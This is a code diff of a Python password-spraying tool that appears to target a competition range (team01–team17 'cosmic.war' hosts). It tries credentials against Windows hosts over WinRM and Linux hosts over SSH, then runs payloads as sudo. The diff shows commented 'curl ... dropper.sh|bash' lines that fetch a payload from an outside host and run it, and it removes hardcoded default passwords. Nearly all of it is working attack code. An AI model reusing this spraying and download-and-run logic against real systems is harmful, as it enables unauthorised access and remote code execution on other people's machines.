@@ -2,6 +2,7 @@ import winrm
 import re
 import paramiko
 import subprocess
+import argparse
 
 # Fixes PyWinRM ipv6 issue (Shoutout illidian80 on github)
 _original_build_url = winrm.Session._build_url
@@ -56,15 +57,26 @@ def windows_execute(session):
 def linux_execute(username, password, host):
     # stdin, stdout, stderr = session.exec_command("curl http://192.168.14.3/download/dropper.sh | bash")
     # replace command with command to run, it gets run as sudo
-    command = "curl -s http://192.168.14.3:443/dropper.sh|bash"
+    # command = "curl -s http://192.168.1.51:443/dropper.sh|bash"
+    command = "whoami"
     output = subprocess.run(f"SSHPASS={password} sshpass -e ssh -t {username}@{host} 'echo \"{password}\" | sudo -S {command}'", capture_output=True, text=True, shell=True)
 
     print(f"Output: {output.stdout.split(f'[sudo] password for {username}:')[1].strip()}")
 
 def main():
+    parser = argparse.ArgumentParser(description='Spray Script')
+    parser.add_argument('--username', required=True, help='Username to spray')
+    parser.add_argument('--password', required=True, help='Password to spray')
+    parser.add_argument('--windows', required=False, help='Spray Windows', action='store_true')
+    parser.add_argument('--linux', required=False, help='Spray Linux', action='store_true')
+
+    username = parser.parse_args().username
+    password = parser.parse_args().password
+
+    spray_windows = parser.parse_args().windows
+    spray_linux = parser.parse_args().linux
+
     for i in range(1, 18):
-        domain = f"team{i:02d}.cosmic.war"
-        
         windows_machines = [
             f"10.{i}.1.1",
             f"10.{i}.1.2",
@@ -83,72 +95,35 @@ def main():
             f"192.168.{i}.5"
         ]
 
-        windows_domain_admin = "admiral"
-
-        windows_domain_credentials = [
-            "nosferatu",
-            "letredin",
-            "admiral",
-            ""
-        ]
-
-        windows_local_credentials = [
-            "nosferatu",
-            "letredin",
-            "captain",
-            ""
-        ]
-
-        local_admin = "captain"
-
-        linux_credentials = [
-            "captain",
-            "nomnom",
-            "father",
-            ""
-        ]
-
-        for host in windows_machines:
-            print(f"Attacking {host}...")
-            found_session = False
-            for i in range(len(windows_local_credentials)):
-                password = windows_local_credentials[i]
+        if spray_windows:
+            for host in windows_machines:
+                print(f"Attacking {host}...")
+                found_session = False
                 if not found_session:
                     try:
-                        print(f"Trying {local_admin}:{password} on {host}")
-                        session = create_windows_session(host, local_admin, password)
+                        print(f"Trying {username}:{password} on {host}")
+                        session = create_windows_session(host, username, password)
                         session.run_cmd(f'powershell -c "whoami"')
-                        print(f"Found valid credentials! {local_admin}:{password} on {host}")
+                        print(f"Found valid credentials! {username}:{password} on {host}")
                         found_session = True
                         print(f"Executing PS payload against {host}")
                         windows_execute(session)
                     except Exception:
-                        try:
-                            password = windows_domain_credentials[i]
-                            print(f"Trying {domain}\\{windows_domain_admin}:{password} on {host}")
-                            session = create_windows_session(host, f"{domain}\\{windows_domain_admin}", password)
-                            session.run_cmd(f'powershell -c "whoami"')
-                            print(f"Found valid credentials! {domain}\\{windows_domain_admin}:{password} on {host}")
-                            found_session = True
-                            print(f"Executing PS payload against {host}")
-                            windows_execute(session)
-                        except Exception:
-                            continue                
+                        continue
 
-
-        for host in linux_machines:
-            found_credentials = False
-            print(f"Attacking {host}...")
-            for password in linux_credentials:
+        if spray_linux:
+            for host in linux_machines:
+                found_credentials = False
+                print(f"Attacking {host}...")
                 try:
                     if not found_credentials:
-                        print(f"Trying {local_admin}:{password} on {host}")
-                        session = create_linux_session(host, local_admin, password)
+                        print(f"Trying {username}:{password} on {host}")
+                        session = create_linux_session(host, username, password)
                         if session is not None:
-                            print(f"Found valid credentials! {local_admin}:{password} on {host}")
+                            print(f"Found valid credentials! {username}:{password} on {host}")
                             print(f"Executing bash payload against {host}")
                             found_credentials = True
-                            linux_execute(local_admin, password, host)
+                            linux_execute(username, password, host)
                         session.close()
                 except Exception:
                     continue
